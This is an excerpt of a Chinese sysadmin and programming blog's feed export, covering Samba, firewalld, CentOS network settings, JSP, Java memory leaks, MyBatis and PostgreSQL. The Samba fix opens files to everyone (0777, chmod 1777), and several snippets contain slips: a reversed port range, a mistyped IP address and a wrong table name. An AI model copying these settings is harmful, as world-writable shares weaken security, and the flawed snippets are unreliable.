<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
<li>linux 系统可以正常读写修改，但 windows 系统只可以读写，直接打开修改时就，就为只读文件了。</li>
<li>*解决办法**：修改 <code>/etc/samba/smb.conf</code> ,在 <code>[share]</code> 中加入以下内容<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">create mask = 0777</span><br></pre></td></tr></table></figure></li>
<li>访问部分文件可以正常访问，但部分文件无法访问。</li>
<li>*解决方法**：修改文件访问权限<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod -R 1777 /home/samba</span><br><span class="line">$ chown nobody:nobody</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.cnblogs.com/lion382/p/4078931.html">CentOS7 安装Samba服务</a></li>
<li><a href="http://blog.leanote.com/post/dapingxia@163.com/CentOS7-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AESamba">CentOS7 安装配置匿名访问Samba</a></li>
</ul>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>samba</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7使用Firewalld</title>
    <url>//CentOS7%E4%BD%BF%E7%94%A8Firewalld</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FirewallD 提供了支持网络/防火墙区域(zone)定义网络链接以及接口安全等级的动态防火墙管理工具。它支持 IPv4, IPv6 防火墙设置以及以太网桥接，并且拥有运行时配置和永久配置选项。它也支持允许服务或者应用程序直接添加防火墙规则的接口。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install firewalld</span><br><span class="line"><span class="comment"># 如果需要图形界面的话，则再安装</span></span><br><span class="line">$ yum install firewall-config</span><br></pre></td></tr></table></figure>

<h3 id="zone"><a href="#zone" class="headerlink" title="zone"></a>zone</h3><p>Firewall 能将不同的网络连接归类到不同的信任级别。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --list-all-zones    <span class="comment">#查看所有zone信息</span></span><br></pre></td></tr></table></figure>
<p>Zone 提供了以下几个级别：</p>
<ul>
<li>drop: 丢弃所有进入的包，而不给出任何响应</li>
<li>block: 拒绝所有外部发起的连接，允许内部发起的连接</li>
<li>public: 允许指定的进入连接</li>
<li>external: 同上，对伪装的进入连接，一般用于路由转发</li>
<li>dmz: 允许受限制的进入连接</li>
<li>work: 允许受信任的计算机被限制的进入连接，类似 workgroup</li>
<li>home: 同上，类似 homegroup</li>
<li>internal: 同上，范围针对所有互联网用户</li>
<li>trusted: 信任所有连接</li>
</ul>
<h3 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h3><ul>
<li>source: 根据源地址过滤</li>
<li>interface: 根据网卡过滤</li>
<li>service: 根据服务名过滤</li>
<li>port: 根据端口过滤</li>
<li>icmp-block: icmp 报文过滤，按照 icmp 类型配置</li>
<li>masquerade: ip 地址伪装</li>
<li>forward-port: 端口转发</li>
<li>rule: 自定义规则</li>
</ul>
<p><em>过滤规则的优先级遵循如下顺序</em></p>
<ol>
<li>source</li>
<li>interface</li>
<li>firewalld.conf</li>
</ol>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ systemctl start firewalld         <span class="comment"># 启动</span></span><br><span class="line">$ systemctl stop firewalld          <span class="comment"># 关闭</span></span><br><span class="line">$ systemctl <span class="built_in">enable</span> firewalld        <span class="comment"># 开机启动</span></span><br><span class="line">$ systemctl <span class="built_in">disable</span> firewalld       <span class="comment"># 取消开机启动</span></span><br></pre></td></tr></table></figure>
<p>具体的规则管理，可以使用 <code>firewall-cmd</code>,具体的使用方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">--zone=NAME                         <span class="comment"># 指定 zone</span></span><br><span class="line">--permanent                         <span class="comment"># 永久修改，--reload 后生效</span></span><br><span class="line">--timeout=seconds                   <span class="comment"># 持续效果，到期后自动移除，用于调试，不能与 --permanent 同时使用</span></span><br></pre></td></tr></table></figure>
<h3 id="查看规则"><a href="#查看规则" class="headerlink" title="查看规则"></a>查看规则</h3><p>查看运行状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --state</span><br></pre></td></tr></table></figure>
<p>查看已被激活的 Zone 信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --get-active-zones</span><br><span class="line">public</span><br><span class="line">  interfaces: eth0 eth1</span><br></pre></td></tr></table></figure>
<p>查看指定接口的 Zone 信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --get-zone-of-interface=eth0</span><br><span class="line">public</span><br></pre></td></tr></table></figure>
<p>查看指定级别的接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --list-interfaces</span><br><span class="line">eth0</span><br></pre></td></tr></table></figure>
<p>查看指定级别的所有信息，譬如 public</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --list-all</span><br><span class="line">public (default, active)</span><br><span class="line">  interfaces: eth0</span><br><span class="line">  sources:</span><br><span class="line">  services: dhcpv6-client http ssh</span><br><span class="line">  ports:</span><br><span class="line">  masquerade: no</span><br><span class="line">  forward-ports:</span><br><span class="line">  icmp-blocks:</span><br><span class="line">  rich rules:</span><br></pre></td></tr></table></figure>
<p>查看所有级别被允许的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --get-service</span><br></pre></td></tr></table></figure>
<p>查看重启后所有 Zones 级别中被允许的服务，即永久放行的服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --get-service --permanent</span><br></pre></td></tr></table></figure>
<h3 id="管理规则"><a href="#管理规则" class="headerlink" title="管理规则"></a>管理规则</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --panic-on           <span class="comment"># 丢弃</span></span><br><span class="line">$ firewall-cmd --panic-off          <span class="comment"># 取消丢弃</span></span><br><span class="line">$ firewall-cmd --query-panic        <span class="comment"># 查看丢弃状态</span></span><br><span class="line">$ firewall-cmd --reload             <span class="comment"># 更新规则，不重启服务</span></span><br><span class="line">$ firewall-cmd --complete-reload    <span class="comment"># 更新规则，重启服务</span></span><br></pre></td></tr></table></figure>
<p>添加某接口至某信任等级，譬如添加 eth0 至 public，永久修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-interface=eth0 --permanent</span><br></pre></td></tr></table></figure>
<p>设置 public 为默认的信任级别</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --set-default-zone=public</span><br></pre></td></tr></table></figure>
<p><strong><code>a. 管理端口</code></strong><br>列出 dmz 级别的被允许的进入端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=dmz --list-ports</span><br></pre></td></tr></table></figure>
<p>允许 tcp 端口 8080 至 dmz 级别</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=dmz --add-port=8080/tcp</span><br></pre></td></tr></table></figure>
<p>允许某范围的 udp 端口至 public 级别，并永久生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-port=5060-5059/udp --permanent</span><br></pre></td></tr></table></figure>
<p><strong><code>b. 网卡接口</code></strong><br>列出 public zone 所有网卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --list-interfaces</span><br></pre></td></tr></table></figure>
<p>将 eth0 添加至 public zone，永久</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --permanent --add-interface=eth0</span><br></pre></td></tr></table></figure>
<p>eth0 存在与 public zone，将该网卡添加至 work zone，并将之从 public zone 中删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=work --permanent --change-interface=eth0</span><br></pre></td></tr></table></figure>
<p>删除 public zone 中的 eth0，永久</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --permanent --remove-interface=eth0</span><br></pre></td></tr></table></figure>
<p><strong><code>c. 管理服务</code></strong><br>添加 smtp 服务至 work zone</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=work --add-service=smtp</span><br></pre></td></tr></table></figure>
<p>移除 work zone 中的 smtp 服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=work --remove-service=smtp</span><br></pre></td></tr></table></figure>
<p><strong><code>d. 配置 external zone 中的 ip 地址伪装</code></strong><br>查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=external --query-masquerade</span><br></pre></td></tr></table></figure>
<p>打开伪装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=external --add-masquerade</span><br></pre></td></tr></table></figure>
<p>关闭伪装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=external --remove-masquerade</span><br></pre></td></tr></table></figure>
<p><strong><code>e. 配置 public zone 的端口转发</code></strong><br>要打开端口转发，则需要先</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-masquerade</span><br></pre></td></tr></table></figure>
<p>然后转发 tcp 22 端口至 3753</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=3753</span><br></pre></td></tr></table></figure>
<p>转发 22 端口数据至另一个 ip 的相同端口上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100</span><br></pre></td></tr></table></figure>
<p>转发 22 端口数据至另一 ip 的 2055 端口上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2055:toaddr=192.168.1.100</span><br></pre></td></tr></table></figure>
<p><strong><code>f. 配置 public zone 的 icmp</code></strong><br>查看所有支持的 icmp 类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --get-icmptypes</span><br><span class="line">destination-unreachable echo-reply echo-request parameter-problem redirect router-advertisement router-solicitation source-quench time-exceeded</span><br></pre></td></tr></table></figure>
<p>列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --list-icmp-blocks</span><br></pre></td></tr></table></figure>
<p>添加 echo-request 屏蔽</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --add-icmp-block=echo-request [--timeout=seconds]</span><br></pre></td></tr></table></figure>
<p>移除 echo-reply 屏蔽</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --zone=public --remove-icmp-block=echo-reply</span><br></pre></td></tr></table></figure>
<p><strong><code>g. IP 封禁</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --permanent --add-rich-rule=<span class="string">&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;222.222.222.222&#x27; reject&quot;</span></span><br></pre></td></tr></table></figure>
<p>当然，我们仍然可以通过 ipset 来封禁 ip</p>
<p>封禁 ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --permanent --zone=public --new-ipset=blacklist --<span class="built_in">type</span>=<span class="built_in">hash</span>:ip</span><br><span class="line">$ firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.222</span><br></pre></td></tr></table></figure>
<p>封禁网段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --permanent --zone=public --new-ipset=blacklist --<span class="built_in">type</span>=<span class="built_in">hash</span>:net</span><br><span class="line">$ firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.0/24</span><br></pre></td></tr></table></figure>
<p>倒入 ipset 规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --permanent --zone=public --new-ipset-from-file=/path/blacklist.xml</span><br></pre></td></tr></table></figure>
<p>然后封禁 blacklist</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --permanent --zone=public --add-rich-rule=<span class="string">&#x27;rule source ipset=blacklist drop&#x27;</span></span><br></pre></td></tr></table></figure>
<p>重新载入以生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ firewall-cmd --reload</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS修改DNS/GW/IP</title>
    <url>//CentOS-DNS-GW-IP</url>
    <content><![CDATA[<h2 id="1-修改DNS"><a href="#1-修改DNS" class="headerlink" title="1.修改DNS"></a>1.修改DNS</h2><p><strong>解决方案一：</strong><br>修改网卡的DNS的配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /etc/resolv.conf</span><br></pre></td></tr></table></figure>
<p>添加以下内容,设置两条dns</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver 8.8.8.8 #google域名服务器</span><br><span class="line">nameserver 8.8.4.4 #google域名服务器</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若未生效，可执行 <code>chattr +i /etc/resolv.conf</code> 设置文件属性只有root用户才能修改<br>然后执行 <code>service NetworkManager restart </code></p>
</blockquote>
<p><strong>解决方案二：</strong><br>对接口添加dns信息；编辑/etc/sysconfig/network-scripts/ifcfg-xxx，xxx为你的网卡名，但一般是ifcfg-eth0的，具体的xxx根据你的网卡确定，在最下面添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNS1=8.8.8.8   #google dns服务器, 根据实际情况更换</span><br><span class="line">DNS2=8.8.4.4   #google dns服务器, 根据实际情况更换</span><br></pre></td></tr></table></figure>
<p>保存后重启网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ service network restart</span><br></pre></td></tr></table></figure>

<h2 id="2-修改网关"><a href="#2-修改网关" class="headerlink" title="2.修改网关"></a>2.修改网关</h2><p>修改网关的配置文件(第3部分也可以设置)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
<p>修改为一下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NETWORKING=yes(表示系统是否使用网络，一般设置为yes。如果设为no，则不能使用网络，而且很多系统服务程序将无法启动)</span><br><span class="line">HOSTNAME=centos(设置本机的主机名，这里设置的主机名要和/etc/hosts中设置的主机名对应)</span><br><span class="line">GATEWAY=192.168.1.1(设置本机连接的网关的IP地址。例如，网关为10.0.0.2)</span><br></pre></td></tr></table></figure>

<h2 id="3-修改ip"><a href="#3-修改ip" class="headerlink" title="3.修改ip"></a>3.修改ip</h2><p>修改对应的网卡的IP地址的配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>
<p>修改为一下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEVICE=eth0 #描述网卡对应的设备别名，例如ifcfg-eth0的文件中它为eth0</span><br><span class="line">BOOTPROTO=static #设置网卡获得ip地址的方式，可能的选项为static，dhcp或bootp，分别对应静态指定的 ip地址，通过dhcp协议获得的ip地址，通过bootp协议获得的ip地址</span><br><span class="line">BROADCAST=192.168.0.255 #对应的子网广播地址</span><br><span class="line">HWADDR=00:07:E9:05:E8:B4 #对应的网卡物理地址</span><br><span class="line">IPADDR=12.168.1.2 #如果设置网卡获得 ip地址的方式为静态指定，此字段就指定了网卡对应的ip地址</span><br><span class="line">IPV6INIT=no</span><br><span class="line">IPV6_AUTOCONF=no</span><br><span class="line">NETMASK=255.255.255.0 #网卡对应的网络掩码</span><br><span class="line">NETWORK=192.168.1.0 #网卡对应的网络地址</span><br><span class="line">ONBOOT=yes #系统启动时是否设置此网络接口，设置为yes时，系统启动时激活此设备</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>JSP操作记录</title>
    <url>//jsp-use-record</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="EL表达式失效"><a href="#EL表达式失效" class="headerlink" title="EL表达式失效"></a>EL表达式失效</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jsp渲染器不识别el表达式，结果页面展示效果如下 --&gt;</span></span><br><span class="line">&#123;person.id&#125; &#123;person.name&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解决方法：</strong><br>在页面内加入下面代码即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=&quot;false&quot; %&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">&quot;$&#123;map&#125;&quot;</span> <span class="attr">var</span>=<span class="string">&quot;entry&quot;</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;entry.key&#125;&quot;</span> /&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;entry.value&#125;&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<h3 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;map[key]&#125;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jsp</tag>
        <tag>jstl</tag>
      </tags>
  </entry>
  <entry>
    <title>[译]Java内存泄露介绍</title>
    <url>//the-introduction-of-memory-leak-what-why-and-how</url>
    <content><![CDATA[<p>内存管理是Java最大的优势之一；你可以很简单的创建一个对象，内存的分配和释放则交给Java垃圾收集器处理；然而实际情况并非如此简单，因为在Java应用程序中会频繁的发生内存泄露。</p>
<p>这个教程将会说明内存泄露是什么？它为什么会发生？我们如何防止它？</p>
<h2 id="内存泄露是什么"><a href="#内存泄露是什么" class="headerlink" title="内存泄露是什么"></a>内存泄露是什么</h2><p>内存泄露的定义：对象不再被应用程序使用，但是由于它们还在被引用，垃圾收集器不能清除掉它们。</p>
<p>为了理解这个定义，我们需要理解对象在内存中的状态；下面的图表说明什么是未被使用和未被引用。</p>
<p><img src="http://img.saodiyang.com/FgwzTgT7v_YeTJ0Y_pWnoJXyfeHg.jpeg" class="lazyload" data-srcset="http://img.saodiyang.com/FgwzTgT7v_YeTJ0Y_pWnoJXyfeHg.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>图表中，有被引用的对象和未被引用的对象；未被引用的对象将会被当做垃圾回收，而被引用的对象将不会被当做垃圾回收；未被引用的对象由于没有被其他对象引用，它当然也是不被使用的对象，然而，不被使用的对象不全是不被引用的，它们中的一些是被引用的！这就是内存泄露的来源。</p>
<h2 id="内存泄露为什么会发生"><a href="#内存泄露为什么会发生" class="headerlink" title="内存泄露为什么会发生"></a>内存泄露为什么会发生</h2><p>让我们来看一下下面这个例子，它说明了内存泄露为什么会发生。在下面这个列子中，对象A引用了对象B，A的生命周期（t1<del>t4）是比B（t2</del>t3）的长；当B不再被应用程序使用时，A仍然在引用它；在这种情况下，垃圾收集器不能从内存中移除B；如果A引用了很多类似B这样的对象，它们不能被回收，又消耗着内存空间的资源，这样很有可能造成内存不足的问题。</p>
<p>还有一种可能的事情，B又引用了一些对象，这些被B引用的对象也不能被回收，那所有这些不被使用的对象将消耗大量宝贵的内存空间。<br><img src="http://img.saodiyang.com/Fm3d2a94sdbY4mb5ua-_BjAusKbq.jpeg" class="lazyload" data-srcset="http://img.saodiyang.com/Fm3d2a94sdbY4mb5ua-_BjAusKbq.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="如何防止内存泄露"><a href="#如何防止内存泄露" class="headerlink" title="如何防止内存泄露"></a>如何防止内存泄露</h2><p>下面有一些防止内存泄露的快速实践技巧</p>
<ol>
<li>注意集合类，如：HashMap、ArrayList等等，因为它们是在常见的地方发生内存泄露；当它们被<code>static</code>声明时，它们和应用程序的生命周期是一样长的。</li>
<li>注意事件监听和回调，当一个监听事件被注册，而这个类再也没有被使用时可能会发生内存泄露。</li>
<li>“如果一个类管理自己的内存，程序员应该被提醒内存泄漏了”，通常，一个对象的指向其他对象的成员变量需要被置为null。</li>
</ol>
<p>References：<br>[1] Program Creek :<a href="http://www.programcreek.com/2013/10/the-introduction-of-memory-leak-what-why-and-how/">The Introduction of Java Memory Leaks</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>translation</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis常用Mapper语句</title>
    <url>//mybatis-Mapper</url>
    <content><![CDATA[<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 简单插入 */</span></span><br><span class="line"><span class="operator">&lt;</span><span class="keyword">insert</span> id<span class="operator">=</span>&quot;insertOne&quot; parameterType<span class="operator">=</span>&quot;Person&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> person (id, name, age) <span class="keyword">VALUES</span>(#&#123;id&#125;, #&#123;name&#125;, #&#123;age&#125;);</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">insert</span><span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 插入并返回对象的主键（数据库序列） */</span></span><br><span class="line"><span class="operator">&lt;</span><span class="keyword">insert</span> id<span class="operator">=</span>&quot;insertOne&quot; parameterType<span class="operator">=</span>&quot;Person&quot; useGeneratedKeys<span class="operator">=</span>&quot;true&quot; keyProperty<span class="operator">=</span>&quot;id&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> person (name, age) <span class="keyword">VALUES</span>(#&#123;name&#125;, #&#123;age&#125;);</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">insert</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 简单更新 */</span></span><br><span class="line"><span class="operator">&lt;</span>update id<span class="operator">=</span>&quot;updateName&quot;<span class="operator">&gt;</span></span><br><span class="line">     update person <span class="keyword">set</span> name <span class="operator">=</span> #&#123;name&#125; <span class="keyword">where</span> id <span class="operator">=</span> #&#123;id&#125;;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>update<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 更新值并返回 */</span></span><br><span class="line"><span class="operator">&lt;</span><span class="keyword">select</span> id<span class="operator">=</span>&quot;updateAge&quot; parameterType<span class="operator">=</span>&quot;Person&quot;<span class="operator">&gt;</span></span><br><span class="line">    update person <span class="keyword">set</span> age <span class="operator">=</span> age <span class="operator">+</span> #&#123;age&#125; <span class="keyword">where</span> id <span class="operator">=</span> #&#123;id&#125; returning age;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">select</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="插入或更新"><a href="#插入或更新" class="headerlink" title="插入或更新"></a>插入或更新</h3><p>记录玩家在某种类型游戏下的统计记录：</p>
<blockquote>
<p>如果没有记录，则从插入，count字段为1；<br>如果有记录，则更新count字段+1；</p>
</blockquote>
<ol>
<li><p>方式一</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="keyword">insert</span> id<span class="operator">=</span>&quot;addCount&quot; parameterType<span class="operator">=</span>&quot;CountRecord&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="comment">/*如果有记录，则更新；无记录，则noting*/</span></span><br><span class="line">    update</span><br><span class="line">      count_record</span><br><span class="line">    <span class="keyword">set</span></span><br><span class="line">      &quot;count&quot; <span class="operator">=</span> &quot;count&quot;<span class="operator">+</span><span class="number">1</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">      type_id <span class="operator">=</span> #&#123;typeId&#125;</span><br><span class="line">    <span class="keyword">and</span></span><br><span class="line">      user_id <span class="operator">=</span> #&#123;userId&#125;;</span><br><span class="line">    <span class="comment">/*如果有记录，则noting；无记录，则插入*/</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">      count_record(type_id, user_id, &quot;count&quot;)</span><br><span class="line">      <span class="keyword">select</span></span><br><span class="line">        #&#123;typeId&#125;, #&#123;userId&#125;, <span class="number">1</span></span><br><span class="line">      <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span></span><br><span class="line">          (<span class="keyword">select</span></span><br><span class="line">              <span class="operator">*</span></span><br><span class="line">           <span class="keyword">from</span></span><br><span class="line">              count</span><br><span class="line">           <span class="keyword">where</span></span><br><span class="line">              type_id <span class="operator">=</span> #&#123;typeId&#125;</span><br><span class="line">           <span class="keyword">and</span></span><br><span class="line">              user_id <span class="operator">=</span> #&#123;userId&#125;);</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">insert</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>方式二</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 利用 PostgreSQL 的 conflic 特性 */</span></span><br><span class="line"><span class="operator">&lt;</span><span class="keyword">insert</span> id<span class="operator">=</span>&quot;addCount&quot; parameterType<span class="operator">=</span>&quot;CountRecord&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">      count_record(type_id, user_id, &quot;count&quot;)</span><br><span class="line">    <span class="keyword">VALUES</span></span><br><span class="line">      (#&#123;typeId&#125;, #&#123;userId&#125;, #&#123;count&#125;)</span><br><span class="line">    <span class="keyword">on</span></span><br><span class="line">      conflict(type_id,user_id)</span><br><span class="line">    do update <span class="keyword">set</span></span><br><span class="line">      &quot;count&quot; <span class="operator">=</span> count_record.&quot;count&quot; <span class="operator">+</span> <span class="number">1</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">insert</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL事务及隔离级别</title>
    <url>//PostgreSQL%E4%BA%8B%E7%89%A9%E5%8F%8A%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>PostgreSQL中提供了多种数据完整性的保证机制。如：约束、触发器、事务和锁管理等。</p>
<p>事务主要是为了保证一组相关数据库的操作能全部执行成功，从而保证数据的完整性。锁机制主要是控制多个用户对同一数据进行操作，使用锁机制可以解决并发问题。</p>
<h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>事务是用户对一个数据库操作的一个序列，这些操作要么全做，要么全不做，是一个不可分割的单位。</p>
<p>事务管理的常用语句如下：</p>
